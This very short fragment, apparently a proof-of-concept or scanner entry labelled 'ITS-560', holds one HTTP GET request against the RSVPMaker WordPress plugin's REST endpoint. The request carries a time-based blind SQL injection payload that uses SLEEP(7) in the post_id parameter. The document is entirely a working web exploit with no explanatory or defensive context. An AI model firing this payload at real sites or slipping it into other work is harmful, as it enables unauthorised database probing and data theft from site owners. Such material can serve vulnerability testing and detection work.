# Vulnerable: ITS-560
GET /wp-json/rsvpmaker/v1/sked/1?post_id=(SELECT%209999%20FROM%20(SELECT(SLEEP(7)))a)
